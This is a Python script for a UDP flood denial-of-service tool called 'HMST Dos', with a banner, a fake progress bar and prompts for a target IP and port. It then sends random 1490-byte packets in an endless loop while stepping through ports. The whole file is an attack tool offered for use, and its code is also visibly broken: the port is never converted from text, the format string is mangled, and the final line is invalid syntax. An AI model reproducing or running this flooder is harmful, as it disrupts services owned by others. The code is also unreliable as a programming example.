import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system ("clear")
os.system("figlet HMST Dos")
print
print ("Dono: Hamster")
print ("Instagram : @hamster.py")
print ("with great power comes great responsibility")
ip = input("Target IP : ")
port  = input("Enter Port   :")

os.system("clear")
os.system("figlet HMST DDos Está Trabalhando Nisso")
print ("[+]--xxxx>                           [+]0% ")
time.sleep(2)
print ("[+]-- xxxxxxx>                          [+]25% ")
time.sleep(2)
print ("[+]--xxxxxxxxx>                          [+]50% ")
time.sleep(3)
print ("[+]--xxxxxxxxxxxxxx>                          [+]75% ")
print ("[+]--xxxxxxxxxxxxxx>                           [+]100% ")
time.sleep(2)
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print ("HamsterNoBlackHat :-Sent %s packet to s% throught port:%s"%sent,ip,port)
    if port : 65534